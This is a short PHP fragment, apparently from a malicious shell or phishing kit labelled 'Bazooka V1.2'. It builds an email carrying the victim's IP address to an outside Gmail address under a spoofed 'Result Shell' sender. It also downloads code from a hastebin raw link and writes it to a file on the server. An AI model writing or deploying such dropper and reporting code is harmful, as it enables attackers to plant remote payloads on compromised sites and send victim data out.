...
$ra44 = rand(1, 99999);
$subj98 = " Bazooka V1.2 |$ip";
$email = "spinningarrix@gmail.com";
$from = "From: ✪ Result Shell ✪<bazooka@shells.com";
...
$text3 = http_get('https://hastebin.com/raw/nazisodibu');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
?>